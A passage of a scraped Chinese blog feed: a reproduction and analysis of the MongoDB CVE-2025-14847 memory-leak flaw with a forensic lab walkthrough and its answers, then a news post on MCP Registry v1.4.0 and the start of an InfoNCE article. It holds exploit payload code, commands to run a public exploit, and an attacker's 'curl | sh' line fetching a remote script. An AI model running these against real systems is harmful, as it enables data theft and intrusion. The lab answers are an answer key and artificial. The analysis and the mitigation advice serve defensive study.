src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152112091-633231826.png\" /></p>\n<h3 id=\"漏洞复现\">漏洞复现</h3>\n<pre><code class=\"language-kotlin\">git clone https://github.com/cybertechajju/CVE-2025-14847_Expolit.git\ncd CVE-2025-14847_Expolit\n</code></pre>\n<p>创建虚拟环境</p>\n<pre><code class=\"language-kotlin\">python -m venv myenv\nsource myenv/bin/activate\n</code></pre>\n<p>安装依赖包</p>\n<pre><code class=\"language-kotlin\">pip install -r requirements.txt\npython mongobleed_pro.py -h\n</code></pre>\n<p><img alt=\"image-20260101225522114\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152112673-1527423820.png\" /></p>\n<p>使用本地的27017漏洞版本测试</p>\n<pre><code>python mongobleed_pro.py --target http://localhost:27017\n</code></pre>\n<p><img alt=\"image-20260101230632647\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152113009-2057906935.png\" /></p>\n<p>泄露了数据，保存在本地的<code>dump_localhost.bin</code>，<code>loot_localhost.txt</code></p>\n<p>同时测试一下<code>27018</code>端口</p>\n<p><img alt=\"image-20260101230957937\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152113400-1983221027.png\" /></p>\n<p>没有漏洞</p>\n<h3 id=\"漏洞分析\">漏洞分析</h3>\n<p>我们从exp上去分析一下</p>\n<p>第一步：</p>\n<pre><code class=\"language-python\">sock = socket.socket()\nsock.settimeout(3)\nsock.connect((host, port))  # 尝试连接MongoDB默认端口27017\n</code></pre>\n<p>第二步：</p>\n<p><code>check_vulnerability()</code>漏洞存在性检测</p>\n<pre><code class=\"language-python\">def check_vulnerability(host, port):\n    hacker_loading(\"Probing target defenses\", 1)\n    test_offsets = [100, 500, 1000, 1500, 2000, 3000]\n    for offset in test_offsets:\n        response = send_probe(host, port, offset, offset + 500)\n        if extract_leaks(response):\n            return True\n    return False\n</code></pre>\n<p>通过不同的\"偏移量（offset）\"发送请求，只要能从响应中提取到非预期数据，就判定目标漏洞未修复。</p>\n<p>第三步：</p>\n<p><code>send_probe()</code>构造payload</p>\n<pre><code class=\"language-python\"># 1. 构造畸形的BSON文档（MongoDB的数据格式）\ncontent = b'\\x10a\\x00\\x01\\x00\\x00\\x00'\nbson = struct.pack('&lt;i', doc_len) + content  # 伪造文档长度（关键漏洞触发点）\n\n# 2. 封装为MongoDB的OP_MSG消息\nop_msg = struct.pack('&lt;I', 0) + b'\\x00' + bson\n\n# 3. 压缩消息（触发漏洞的关键操作）\ncompressed = zlib.compress(op_msg)\n\n# 4. 构造最终恶意载荷（包含压缩标识+畸形数据）\npayload = struct.pack('&lt;I', 2013) + struct.pack('&lt;i', buffer_size) + struct.pack('B', 2) + compressed\n\n# 5. 加上MongoDB协议头，发送给目标\nheader = struct.pack('&lt;IIII', 16 + len(payload), 1, 0, 2012)\nsock.sendall(header + payload)\n</code></pre>\n<ol>\n<li>伪造的BSON文档长度(doc_len)与实际内容不匹配</li>\n<li>对请求进行zlib压缩后，MongoDB的解压/解析逻辑存在缺陷，导致内存越界读取</li>\n<li>攻击者通过控制doc_len和buffer_size（缓冲区大小），精准控制内存读取的范围</li>\n</ol>\n<p>第四步：</p>\n<p>发送请求并接收泄露数据（send_probe()后续逻辑）</p>\n<pre><code class=\"language-python\">response = b''\nwhile len(response) &lt; 4 or len(response) &lt; struct.unpack('&lt;I', response[:4])[0]:\n    chunk = sock.recv(4096) #持续接受响应（直到完整读取）\n    if not chunk: break\n    response += chunk\n</code></pre>\n<p>获取目标返回的、包含内存泄漏数据的响应包</p>\n<p>第五步：</p>\n<p>提取泄露的内存数据即 extract_leaks函数</p>\n<p>批量提取+敏感信息识别<code>run_exploit()</code> + <code>analyze_secrets()</code></p>\n<p>还有保存攻击结果（持久化loot）</p>\n<p>攻击总结：</p>\n<p><img alt=\"image-20260102153604895\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152113901-643757865.png\" /></p>\n<p>回到源码</p>\n<p><a href=\"https://github.com/mongodb/mongo/blob/r8.0.16/src/mongo/transport/message_compressor_zlib.cpp\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/mongodb/mongo/blob/r8.0.16/src/mongo/transport/message_compressor_zlib.cpp</a></p>\n<p><img alt=\"image-20260102154747986\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152114375-627847864.png\" /></p>\n<p>原本用于返回解压数据大小的行使用了<code>return {output.length()};</code>这行代码，它告诉代码返回已分配的内存量，而不是解压数据的实际长度。新的<code>return {length};</code>确保只返回解压缩数据的实际长度。</p>\n<p><a href=\"https://github.com/mongodb/mongo/blob/master/src/mongo/transport/message_compressor_zlib.cpp\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/mongodb/mongo/blob/master/src/mongo/transport/message_compressor_zlib.cpp</a></p>\n<p><img alt=\"image-20260102155010199\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152114721-1137957807.png\" /></p>\n<p>进一步分析可以发现，在新的<code>src/mongo/transport/message_compressor_manager_test.cpp</code>中多了一个checkUndersize函数</p>\n<pre><code class=\"language-cpp\">void checkUndersize(const Message&amp; compressedMsg,\n                    std::unique_ptr&lt;MessageCompressorBase&gt; compressor) {\n    MessageCompressorRegistry registry;\n    const auto compressorName = compressor-&gt;getName();\n\n    std::vector&lt;std::string&gt; compressorList = {compressorName};\n    registry.setSupportedCompressors(std::move(compressorList));\n    registry.registerImplementation(std::move(compressor));\n    registry.finalizeSupportedCompressors().transitional_ignore();\n\n    MessageCompressorManager mgr(&amp;registry);\n    BSONObjBuilder negotiatorOut;\n    std::vector&lt;StringData&gt; negotiator({compressorName});\n    mgr.serverNegotiate(negotiator, &amp;negotiatorOut);\n    checkNegotiationResult(negotiatorOut.done(), {compressorName});\n\n    auto swm = mgr.decompressMessage(compressedMsg);\n    ASSERT_EQ(ErrorCodes::BadValue, swm.getStatus());\n}\n</code></pre>\n<p>核心逻辑在</p>\n<p><img alt=\"image-20260102155616512\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152115003-534946274.png\" /></p>\n<p><code>mgr.decompressMessage(compressedMsg)</code>:调用压缩器管理器解压传入的“异常”的压缩消息</p>\n<p><code>ASSERT_EQ(ErrorCodes::BadValue, swm.getStatus())</code>：单元测试断言</p>\n<p>主要目的是验证当传入一个 “尺寸异常（undersize）” 的压缩消息时，消息解压逻辑能正确返回 <code>ErrorCodes::BadValue</code> 错误码</p>\n<p>同时在下面也给到了测试用例</p>\n<p><img alt=\"image-20260102155917477\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152115354-1662843965.png\" /></p>\n<p>重点看一下Zlib的测试用例</p>\n<pre><code class=\"language-cpp\">TEST(ZlibMessageCompressor, Undersize) {\n    // 1. 构造Zlib算法的“尺寸异常”二进制消息数据\n    std::vector&lt;std::uint8_t&gt; payload = {\n        0x3c, 0x00, 0x00, 0x00, 0xad, 0xde, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xdc, 0x07, 0x00,\n        0x00, 0xdd, 0x07, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x02, 0x78, 0xda, 0x63, 0x60, 0x00,\n        0x82, 0xdf, 0xf2, 0x0c, 0x0c, 0xac, 0xf1, 0x99, 0x29, 0x0c, 0x0c, 0x02, 0x40, 0x9e, 0x87,\n        0xab, 0x63, 0x80, 0x8f, 0xab, 0xa3, 0x37, 0x03, 0x12, 0x00, 0x00, 0x6d, 0x26, 0x04, 0x97};\n\n    // 2. 分配缓冲区并拷贝数据\n    auto buffer = SharedBuffer::allocate(payload.size());\n    std::copy(payload.begin(), payload.end(), buffer.get());\n\n    // 3. 调用测试函数：传入异常消息 + Zlib压缩器实例\n    checkUndersize(Message(buffer), std::make_unique&lt;ZlibMessageCompressor&gt;());\n}\n</code></pre>\n<table>\n<thead>\n<tr>\n<th>字节范围</th>\n<th>含义</th>\n<th>对应 payload 值</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>0-3</td>\n<td>消息总长度（小端序 uint32）</td>\n<td>0x3c 0x00 0x00 0x00</td>\n<td>解析为十进制 60 → 声明消息总长度是 60 字节</td>\n</tr>\n<tr>\n<td>4-7</td>\n<td>魔数 / 标识</td>\n<td>0xad 0xde 0x00 0x00</td>\n<td>MongoDB 自定义的压缩消息标识（0xADDE 是固定值）</td>\n</tr>\n<tr>\n<td>8-11</td>\n<td>保留字段</td>\n<td>0x00 0x00 0x00 0x00</td>\n<td>无实际意义，占位</td>\n</tr>\n<tr>\n<td>12-15</td>\n<td>压缩器类型（小端序 uint32）</td>\n<td>0xdc 0x07 0x00 0x00</td>\n<td>解析为十进制 2012 → 标识这是 Zlib 压缩的数据（不同压缩器有专属数值）</td>\n</tr>\n<tr>\n<td>16-19</td>\n<td>保留字段</td>\n<td>0xdd 0x07 0x00 0x00</td>\n<td>占位</td>\n</tr>\n<tr>\n<td>20-23</td>\n<td>原始数据长度（小端序 uint32）</td>\n<td>0x00 0x20 0x00 0x00</td>\n<td>解析为十进制 8192 → 声明解压后原始数据长度是 8192 字节</td>\n</tr>\n<tr>\n<td>24</td>\n<td>压缩算法标识</td>\n<td>0x02</td>\n<td>Zlib 的算法标识（Snappy 是 0x01，Zstd 是 0x03）</td>\n</tr>\n<tr>\n<td>25+</td>\n<td>Zlib 压缩数据体</td>\n<td>0x78 0xda ... 0x04 0x97</td>\n<td>Zlib 格式的压缩数据（但被故意构造为 “尺寸不足”）</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>头部声明 “原始数据长度是 8192 字节”，但实际的 Zlib 压缩数据体只有 <code>60-25=35</code> 字节 → 远不足以解压出 8192 字节的原始数据，解压逻辑会检测到 “数据尺寸不足”。</li>\n</ul>\n<p><img alt=\"image-20260102160356664\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152115814-318572431.png\" /></p>\n<h3 id=\"漏洞修复\">漏洞修复</h3>\n<p>1.立即升级到<strong>已修复版本</strong>：</p>\n<p>立即升级到：</p>\n<ul>\n<li>8.2.3、8.0.17、7.0.28、6.0.27、5.0.32、4.4.30</li>\n<li>MongoDB Atlas（托管版）已自动修复。</li>\n</ul>\n<p>2.<strong>临时缓解</strong>：<br />\n禁用 <code>zlib</code> 压缩<br />\n（启动参数：<code>--networkMessageCompressors=snappy,zstd</code> 或配置文件中排除 zlib）<br />\n不要将27017端口暴露在互联网<br />\n数据库访问设置白名单,不要设置任何ip可访问</p>\n<h2 id=\"task2\">Task2</h2>\n<p>What is the version of MongoDB installed on the server that the CVE exploited?</p>\n<p>分析位于<code>MangoBleed\\uac-mongodbsync-linux-triage\\[root]\\var\\log\\mongodb\\mongod.log</code></p>\n<p><img alt=\"image-20260102161150999\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152116177-1760271411.png\" /></p>\n<p>8.0.16</p>\n<h2 id=\"task3\">Task3</h2>\n<p>Analyze the MongoDB logs to identify the attacker’s remote IP address used to exploit the CVE.</p>\n<p>在日志中关注事件ID22943(连接)和ID22944(断开连接)</p>\n<p>65.0.76.43</p>\n<p>我们也可以用工具进行分析</p>\n<p><a href=\"https://github.com/Neo23x0/mongobleed-detector\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/Neo23x0/mongobleed-detector</a></p>\n<pre><code class=\"language-kotlin\"># Shell script dependencies\n# Debian/Ubuntu\napt-get install jq gawk gzip\n\n# RHEL/CentOS/Fedora\ndnf install jq gawk gzip\n\n# macOS\nbrew install jq gawk\n\n# Python remote scanner has no additional dependencies\n# Uses native ssh/scp commands\n\n\n# Clone the repository\ngit clone https://github.com/your-org/mongobleed-detector.git\ncd mongobleed-detector\n\n# Make executable\nchmod +x mongobleed-detector.sh\n</code></pre>\n<pre><code class=\"language-kotlin\">./mongobleed-detector.sh --no-default-paths -p ./mongod.log -t 10000\n</code></pre>\n<p><img alt=\"image-20260102164314888\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152116518-329116859.png\" /></p>\n<h2 id=\"task4\">Task4</h2>\n<p>Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event)</p>\n<p><img alt=\"image-20260102164437061\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152116838-1010417894.png\" /></p>\n<p>根据上图可以看到</p>\n<p>2025-12-29 05:25:52</p>\n<h2 id=\"task5\">Task5</h2>\n<p>Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.</p>\n<p>同样在上图</p>\n<p><img alt=\"image-20260102165143240\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152117142-1389182106.png\" /></p>\n<ul>\n<li><strong>Risk</strong>：风险等级（这里是<code>HIGH</code>，表示高风险）</li>\n<li><strong>SourceIP</strong>：来源 IP 地址（这里是<code>65.0.76.43</code>）</li>\n<li><strong>ConnCount</strong>：连接次数（37630 次，短时间内大量连接）</li>\n<li><strong>MetaCount</strong>：元数据操作次数（0 次）</li>\n<li><strong>DiscCount</strong>：断开连接次数（37630 次，和连接数一致，说明连接后立即断开）</li>\n<li><strong>MetaRate%</strong>：元数据操作占比（0.00%）</li>\n<li><strong>BurstRate/m</strong>：每分钟爆发连接数（30104 次，短时间内连接频率极高）</li>\n<li><strong>First/LastSeen</strong>：首次 / 最后一次出现的时间（2025-12-29 的 2 分钟内完成了大量连接）</li>\n</ul>\n<p>所以总共为75260</p>\n<p>75260</p>\n<h2 id=\"task6\">Task6</h2>\n<p>The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?</p>\n<p>访问/var/log/auth.log日志</p>\n<p><img alt=\"image-20260102171320748\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152117520-781480417.png\" /></p>\n<p>2025-12-29 05:40:03</p>\n<h2 id=\"task7\">Task7</h2>\n<p>Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.</p>\n<p><img alt=\"image-20260102172751711\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152117901-872419183.png\" /></p>\n<p>确定用户为mongoadmin</p>\n<p><code>uac-mongodbsync-linux-triage\\[root]\\home\\mongoadmin</code>下的.bash_history文件中</p>\n<p><img alt=\"image-20260102172905804\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152118284-543519413.png\" /></p>\n<p><code>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh</code></p>\n<h2 id=\"task8\">Task8</h2>\n<p>The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?</p>\n<p><img alt=\"image-20260102173145834\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152118612-1268812667.png\" /></p>\n<p>同样去分析一下</p>\n<p>/var/lib/mongodb</p>\n<p><img alt=\"image-20260102173140081\" src=\"https://img2024.cnblogs.com/blog/3588329/202601/3588329-20260103152119029-1224398251.png\" /></p>\n<p>文章借鉴：</p>\n<p><a href=\"https://www.cnblogs.com/hzhsec/p/19428472\" target=\"_blank\">https://www.cnblogs.com/hzhsec/p/19428472</a></p>\n<p><a href=\"https://www.gm7.org/archives/16179\" rel=\"noopener nofollow\" target=\"_blank\">https://www.gm7.org/archives/16179</a></p>\n<p><strong>免责声明</strong></p>\n<p>本文档<code>MongoDB漏洞复现（CVE-2025-14847）</code>所包含的漏洞复现方法、技术细节及利用代码，<strong>仅限用于授权的安全测试、教育学习与研究目的</strong>。</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-03 15:22</span>&nbsp;\n<a href=\"https://www.cnblogs.com/DSchenzi\">dynasty_chenzi</a>&nbsp;\n阅读(<span id=\"post_view_count\">67</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "MCP Registry v1.4.0 最新进展",
      "link": "https://www.cnblogs.com/shanyou/p/19432926",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/shanyou/p/19432926\" id=\"cb_post_title_url\" title=\"发布于 2026-01-02 22:34\">\n    <span>MCP Registry v1.4.0 最新进展</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p><font face=\"微软雅黑 Light\" size=\"3\">2025 年 12 月 16 日发布的 Registry v1.4.0 版本 ，不仅是技术规格的一次迭代，更是整个协议迈向成熟的重要里程碑。该版本引入了严格的 2025-12-11 模式定义 ，正式确立了对 streamable-http 传输层的原生支持，并重构了发布者验证流程。与此同时，MCP 的治理结构发生了历史性变革——Anthropic 将该协议捐赠给 Linux 基金会旗下新成立的 Agentic AI 基金会 (AAIF)。这一举措有效地消除了企业采用该协议的供应商锁定顾虑，促成了包括 AWS、Google Cloud、Cisco 和 Microsoft 在内的行业巨头对该标准的全面拥抱。</font></p><p><font face=\"微软雅黑 Light\" size=\"3\">要理解 v1.4.0 版本的技术意义，必须首先审视 MCP 旨在解决的核心架构挑战。在 MCP 出现之前，将 LLM 连接到外部数据源（如 PostgreSQL 数据库、GitHub 仓库或 Notion 文档）需要针对每个模型提供商编写定制的集成代码。</font></p><p><font face=\"微软雅黑 Light\" size=\"3\">在前 MCP 时代，开发者面临着所谓的“N x M”集成困境。假设有 N 个主流 AI 模型（如 Claude 3.5, GPT-4o, Gemini 1.5）和 M 个外部工具或数据源。若要实现互操作性，理论上需要维护 N * M 个独立的连接器。这种架构不仅脆弱，而且极难扩展。一旦数据源的 API 发生变更，或者开发者决定切换 AI 模型，所有的集成工作都需要推倒重来 。</font></p><p><font face=\"微软雅黑 Light\" size=\"3\">MCP 通过引入标准化的中间层，将这一复杂度降低为 N + M。</font></p><ul><li><p><font face=\"微软雅黑 Light\" size=\"3\">标准化接口： MCP 定义了一套通用的 JSON-RPC 2.0 消息格式，使得任何兼容 MCP 的主机（Host）都可以直接与任何 MCP 服务器（Server）通信，而无需了解后者的底层实现细节。</font></p></li><li><p><font face=\"微软雅黑 Light\" size=\"3\"><font face=\"微软雅黑 Light\" size=\"3\">通用连接器： 这意味着一个针对 Google Drive 开发的 MCP 服务器，可以同时被 Claude Desktop、Cursor IDE、VS Code 甚至定制的企业 AI 代理所使用，真正实现了“一次编写，到处运行”的愿景。</font></font></p></li></ul><p><font face=\"微软雅黑 Light\" size=\"3\">随着 v1.4.0 的发布，MCP 的组件体系已高度成熟，形成了清晰的四层架构：</font></p><ol><li><p><font face=\"微软雅黑 Light\" size=\"3\">MCP Host（主机）：<br />这是 AI 模型的运行环境，也是集成的发起端。典型的主机包括 Claude Desktop、Cursor、Windsurf 以及各类企业级 AI 网关。主机负责管理与用户的交互上下文，并将用户的自然语言意图转化为对 MCP 工具的调用请求 。</font></p></li><li><p><font face=\"微软雅黑 Light\" size=\"3\">MCP Client（客户端）：<br />嵌入在主机内部的协议实现层。它负责与服务器建立 1:1 的连接，处理协议握手、能力协商（Capabilities Negotiation）以及消息的序列化与反序列化。在 v1.4.0 生态中，客户端承担了更多安全职责，如 OAuth 2.0 令牌管理和权限范围（Scope）控制 。</font></p></li><li><p><font face=\"微软雅黑 Light\" size=\"3\">MCP Server（服务器）：<br />这是生态系统的核心资产。服务器是一个轻量级的网关程序，它封装了特定的数据源或工具，并通过 MCP 协议暴露给外界。服务器可以极其简单（如一个只读的 SQLite 查询器），也可以极其复杂（如一个具有推理能力的 GitHub 运维代理）。v1.4.0 版本极大地增强了服务器的元数据定义能力，使其能够更精准地向注册表描述自身行为。</font></p></li><li><p><font face=\"微软雅黑 Light\" size=\"3\">Transport Layer（传输层）：<br />通信的管道。</font></p></li></ol><ul><ul><li><p><font face=\"微软雅黑 Light\" size=\"3\">Stdio（标准输入输出）： 在 MCP 早期主要用于本地开发，通过进程间通信（IPC）实现极其低延迟的交互，且天然隔离网络风险。</font></p></li><li><p><font face=\"微软雅黑 Light\" size=\"3\">SSE (Server-Sent Events) over HTTP: 随着 v1.4.0 对远程连接支持的完善，基于 HTTP 的 SSE 传输已成为主流。它允许服务器独立部署在云端（如 Docker 容器或 Serverless 函数中），并通过标准 URL 被远程客户端访问。这种模式是企业级“远程 MCP”部署的基石。</font></p></li></ul></ul><p><font face=\"微软雅黑 Light\" size=\"3\">&nbsp;&nbsp;&nbsp;&nbsp; 2025 年 12 月 16 日，modelcontextprotocol/registry 仓库发布了 v1.4.0 版本。这一版本不仅仅是代码的更新，更是对整个注册表服务（Registry Service）数据模型的一次重构，旨在适应日益复杂的分布式生态系统。</font></p><p><br /></p><p><font face=\"微软雅黑 Light\" size=\"3\">v1.4.0 最具破坏性但也最具建设性的变更是强制采用了新的 server.json 模式定义，版本号为 2025-12-11。server.json 文件是 MCP 服务器在注册表中的“身份证”，它定义了服务器的名称、描述、安装方式及版本信息。</font></p><p><font face=\"微软雅黑 Light\" size=\"3\">在此之前的版本（如 2025-10-17）中，模式定义相对宽松，允许许多非标准字段存在，且对远程连接的定义不够严谨。新的模式带来了以下关键改进：</font></p><h6><font face=\"微软雅黑 Light\" size=\"3\" style=\"font-weight: normal;\">1 、严格的传输层定义：<font face=\"微软雅黑 Light\" size=\"3\">新模式显式地标准化了 remotes 字段中 streamable-http 的配置方式。<font face=\"微软雅黑 Light\" size=\"3\">在旧版本中，远程服务器的配置往往依赖于特定客户端的约定俗成。而在 v1.4.0 中，server.json 必须严格遵循以下结构来声明远程能力 。<font face=\"微软雅黑 Light\" size=\"3\">这种严格的类型定义（Type Safety）确保了无论是 VS Code 还是 Claude Desktop，在解析远程服务器时都能准确识别连接方式和认证需求，消除了因配置模糊导致的连接失败。</font></font></font></font></h6><h6><font face=\"微软雅黑 Light\" size=\"3\" style=\"font-weight: normal;\">2 、移除 status 字段与动态健康检查：<font face=\"微软雅黑 Light\" size=\"3\">v1.4.0 移除了 server.json 中的 status 字段 。此前，开发者需要手动在 JSON 文件中标记服务器状态（如 \"beta\", \"stable\"）。这种静态标记往往与实际运行状态脱节。<font face=\"微软雅黑 Light\" size=\"3\">新版本的设计理念是：健康状态应当是动态监测的结果，而非静态声明。 注册表服务现在通过内置的验证逻辑（Validation Logic）定期轮询服务器，根据实际响应情况决定其在索引中的可见性。这显著提高了注册表数据的可信度，防止用户安装已停摆的“僵尸服务器”。</font></font></font></h6><h6><font face=\"微软雅黑 Light\" size=\"3\" style=\"font-weight: normal;\">3、 版本一致性强制：<font face=\"微软雅黑 Light\" size=\"3\">新模式引入了严格的版本一致性检查。server.json 中的 version 字段现在必须与 Git Tag 或包管理器（NPM/PyPI）中的版本号严格匹配 。如果注册表检测到版本号不一致（例如 server.json 声明了 v2.0.0 但 Git Tag 只有 v1.9.0），发布流程将自动失败。这一机制有效地杜绝了“幽灵版本”问题，确保用户拉取的代码与注册表描述完全一致。</font></font></h6><p><font face=\"微软雅黑 Light\" size=\"3\">伴随注册表更新，官方发布工具 mcp-publisher 也同步升级至 v1.4.0 17。该 CLI 工具是开发者与 MCP 注册表交互的主要接口。</font> </p><p><font face=\"微软雅黑 Light\" size=\"3\">v1.4.0 版本的发布器深度集成了 OpenID Connect (OIDC) 协议，特别是针对 GitHub Actions 的环境。这意味着开发者不再需要生成和维护长效的 API 密钥（Long-lived Secrets）来发布更新。</font></p><p><font face=\"微软雅黑 Light\" size=\"3\">通过配置 GitHub Action Workflow，mcp-publisher 可以利用临时的 OIDC 令牌向注册表证明身份。注册表服务端会验证该令牌是否由合法的 GitHub 仓库签发，从而授权发布。这极大地提升了供应链的安全性，因为即便发布脚本泄露，攻击者也无法在外部环境伪造有效的 OIDC 令牌 。</font></p><h6><font face=\"微软雅黑 Light\" size=\"3\">新版工具引入了更强大的 check 和 init 命令。</font></h6><ul><li><p><font face=\"微软雅黑 Light\" size=\"3\">mcp-publisher init：能够智能分析当前目录结构（识别是 Node.js 项目还是 Python 项目），自动生成符合 2025-12-11 标准的 server.json 模板。</font></p></li><li><p><font face=\"微软雅黑 Light\" size=\"3\">mcp-publisher check（或集成在发布流程中的验证）：在上传前对 JSON 文件进行本地 Schema 校验。这解决了以往提交后才发现格式错误导致发布失败的痛点，缩短了反馈循环</font> 。</p></li></ul><p><font face=\"微软雅黑 Light\" size=\"3\"><br /></font></p><p><font face=\"微软雅黑 Light\" size=\"3\">如果说 Registry v1.4.0 是技术的升级，那么 Agentic AI 基金会 (AAIF) 的成立则是 MCP 走向行业标准的政治宣言。2025 年 12 月 9 日，Anthropic 正式宣布将 MCP 项目及其相关资产捐赠给 Linux 基金会旗下新成立的 AAIF。</font></p><p><font face=\"微软雅黑 Light\" size=\"3\">在 2024 年至 2025 年间，AI 领域被视为各大巨头（OpenAI, Google, Anthropic, Meta）争夺生态主导权的战场。如果 MCP 始终由 Anthropic 一家公司控制，其他竞争对手（尤其是 OpenAI 和 Google）将很难毫无保留地采纳这一标准，因为这涉及到生态锁定的风险。</font></p><p><font face=\"微软雅黑 Light\" size=\"3\"><font face=\"微软雅黑 Light\" size=\"3\">通过将 MCP 移交给 Linux 基金会这一中立机构，Anthropic 效仿了 Google 捐赠 Kubernetes 给 CNCF 的成功路径。这一举措产生了立竿见影的效果：</font></font></p><ul><li><p><font face=\"微软雅黑 Light\" size=\"3\">消除信任障碍： AWS 和 Google Cloud 随即宣布加强对 MCP 的支持，因为标准不再属于某个单一竞争对手。</font></p></li><li><p><font face=\"微软雅黑 Light\" size=\"3\">统一战线： OpenAI 不仅加入了基金会，还捐赠了其 AGENTS.md 标准。这意味着行业正在走向融合——OpenAI 的代理定义规范与 MCP 的工具连接规范将在 AAIF 的框架下进行整合，形成一套完整的“代理技术栈”。</font></p></li></ul><p><font face=\"微软雅黑 Light\" size=\"3\"><br /></font></p><p><font face=\"微软雅黑 Light\" size=\"3\"><br /></font></p>\n</div>\n<div id=\"MySignature\">\n    <p>欢迎大家扫描下面二维码成为我的客户，扶你上云</p>\n<img src=\"https://images.cnblogs.com/cnblogs_com/shanyou/57459/o_220125090408_%E9%82%80%E8%AF%B7%E4%BA%8C%E7%BB%B4%E7%A0%81-258px.jpeg\" width=\"170\" />\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-02 22:34</span>&nbsp;\n<a href=\"https://www.cnblogs.com/shanyou\">张善友</a>&nbsp;\n阅读(<span id=\"post_view_count\">219</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "Contrastive Learning 对比学习 | InfoNCE loss 与互信息的数学关联",
      "link": "https://www.cnblogs.com/moonout/p/19432533",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/moonout/p/19432533\" id=\"cb_post_title_url\" title=\"发布于 2026-01-02 20:07\">\n    <span>Contrastive Learning 对比学习 | InfoNCE loss 与互信息的数学关联</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        InfoNCE loss 可以表示互信息的下界：I(X;Y) ≥ log N - L_InfoNCE 。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<br />\n<p>参考博客：<a href=\"https://blog.csdn.net/iiiiii11/article/details/154584585\" rel=\"noopener nofollow\" target=\"_blank\">CSDN | 【理论推导】互信息与 InfoNCE 损失：从公式推导理解对比学习的本质</a> ，感觉是讲的最清楚的一个博客。</p>\n<hr />\n<p></p><div class=\"toc\"><div class=\"toc-container-header\">目录</div><ul><li><a href=\"#1-infonce-loss-和互信息的数学形式\" rel=\"noopener nofollow\">1 InfoNCE loss 和互信息的数学形式</a><ul><li><a href=\"#11-互信息的数学形式\" rel=\"noopener nofollow\">1.1 互信息的数学形式</a></li><li><a href=\"#12-infonce-loss-的数学形式\" rel=\"noopener nofollow\">1.2 InfoNCE loss 的数学形式</a></li><li><a href=\"#13-为什么我们希望最大化--的互信息\" rel=\"noopener nofollow\">1.3 为什么我们希望最大化 <span class=\"math inline\">\\((X,Y)\\)</span> 的互信息</a></li></ul></li><li><a href=\"#2-infonce-loss-与互信息的数学关联\" rel=\"noopener nofollow\">2 InfoNCE loss 与互信息的数学关联</a></li><li><a href=\"#3-证明过程\" rel=\"noopener nofollow\">3 证明过程</a><ul><li><a href=\"#31-第一步证明使-infonce-loss-取值最小的-满足-\" rel=\"noopener nofollow\">3.1 第一步：证明使 InfoNCE loss 取值最小的 <span class=\"math inline\">\\(f(x,y)\\)</span>，满足 <span class=\"math inline\">\\(f(x, y) = \\log [p(y|x) / p(y)]\\)</span></a></li><li><a href=\"#32-第二步将以上--代入推导互信息下界\" rel=\"noopener nofollow\">3.2 第二步：将以上 <span class=\"math inline\">\\(f(x,y)\\)</span> 代入，推导互信息下界</a></li></ul></li></ul></div><p></p>\n<hr />\n<h2 id=\"1-infonce-loss-和互信息的数学形式\">1 InfoNCE loss 和互信息的数学形式</h2>\n<h3 id=\"11-互信息的数学形式\">1.1 互信息的数学形式</h3>\n<p>互信息 <span class=\"math inline\">\\(I(X,Y)\\)</span> 是信息论中的核心概念，用于衡量两个随机变量 <span class=\"math inline\">\\(X,Y\\)</span> 